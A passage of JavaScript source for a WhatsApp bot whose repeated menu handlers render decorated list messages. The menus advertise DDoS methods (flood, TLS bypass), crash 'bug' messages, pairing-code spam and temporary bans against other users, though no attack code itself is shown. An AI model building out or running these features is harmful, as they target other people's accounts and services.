id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'installpanelmenu': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ INSTALL MENU〽️ ⿻        )
┏─『 \`INSTALL MENU\` 』
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ1 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 20.04]
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ2 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 22.04 - 24.04]
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ3 [sᴜᴘᴘᴏʀᴛ ᴅᴇʙɪᴀɴ 11x64]
│ ● ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
│ ● ᴄʀᴇᴀᴛᴇɴᴏᴅᴇ
│ ● ɪɴsᴛᴀʟʟᴡɪɴɢs
│ ● sᴛᴀʀᴛᴡɪɴɢs
│ ● ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ1 [ᴛʜᴇᴍᴀ sᴛᴇʟʟᴇʀ]
│ ● ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ2 [ᴛʜᴇᴍᴀ ᴇɴɪɢᴍᴀ]
│ ● ᴜɴɪɴsᴛᴀʟʟᴛʜᴇᴍᴀ
┗─────────────❐

┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'ddosmenu': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ DDOS MENU〽️ ⿻        )
┏─『 \`DDOS MENU\` 』
│ ● ᴅᴅᴏs
│ ● ᴍɪx
│ ● ғʟᴏᴀᴅs
│ ● ᴜᴀ
│ ● xᴄʜʀᴏᴍᴇ
│ ● ᴛʟs
│ ● ᴛʟsʙʏᴘᴀss
│ ● ᴛʟsᴠ2
│ ● ᴛʟs-ᴠɪᴘ
│ ● xc
┗─────────────❐

┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'grupmenu': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ 𝐆𝐑𝐔𝐏 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐆𝐑𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
│ ● ʜɪᴅᴇᴛᴀɢ
│ ● ᴘʀᴏᴍᴏᴛᴇ
│ ● ᴅᴇᴍᴏᴛᴇ
│ ● ᴀɴᴛɪʟɪɴᴋ
│ ● ᴀɴᴛɪʟɪɴᴋᴠ2
│ ● ᴏᴘᴇɴ/ᴄʟᴏsᴇ
│ ● sᴇᴛɴᴀᴍᴀɢᴄ
│ ● sᴇᴛᴘᴘɢᴄ
│ ● ᴋɪᴄᴋ
│ ● ʜɪᴅᴇᴛᴀɢ
│ ● ʟᴇᴀᴠᴇɢᴄ
│ ● ʟᴇᴀᴠᴇɢᴄ2
┗─────────────❐
┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'unbandmenu': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ 𝐔𝐍𝐁𝐀𝐍𝐃 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐔𝐍𝐁𝐀𝐍𝐃 𝐌𝐄𝐍𝐔\` 』
│ ● ᴜɴʙᴀɴᴅᴠ1
│ ● ᴜɴʙᴀɴᴅᴠ2
│ ● ᴜɴʙᴀɴᴅᴠ3
│ ● ᴜɴʙᴀɴᴅᴠ4
│ ● ᴜɴʙᴀɴᴅᴠ5
│ ● ᴜɴʙᴀɴᴅᴠ6
│ ● ᴋᴇɴᴏɴɪɴ
│ ● ᴠᴇʀɪғʏ
│ ● ʀᴇsᴇᴛᴏᴛᴘ
┗─────────────❐
┏━━⬣  Thanks To  友
┃ 🔥 𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟 <dev>
┃ 🔥 𝐙𝐲𝐱𝐧𝐨𝐨
┃ 🔥 𝐏𝐚𝐤𝐭𝐳𝐲
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
